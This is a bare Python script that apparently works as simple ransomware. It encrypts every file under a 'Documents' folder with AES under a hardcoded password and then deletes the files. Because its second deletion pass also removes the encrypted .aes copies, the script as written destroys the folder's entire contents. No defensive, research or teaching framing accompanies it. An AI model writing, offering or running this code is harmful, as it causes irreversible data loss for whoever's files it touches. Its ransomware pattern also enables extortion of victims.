import os
import sys
import pyAesCrypt

bufferSize = 64 * 1024
password = "12345"

# encrypt the Documents folder
for root, dirs, files in os.walk("Documents"):
    for file in files:
        filePath = os.path.join(root, file)
        pyAesCrypt.encryptFile(filePath, filePath + ".aes", password, bufferSize)

# delete the original files
for root, dirs, files in os.walk("Documents"):
    for file in files:
        os.remove(os.path.join(root, file))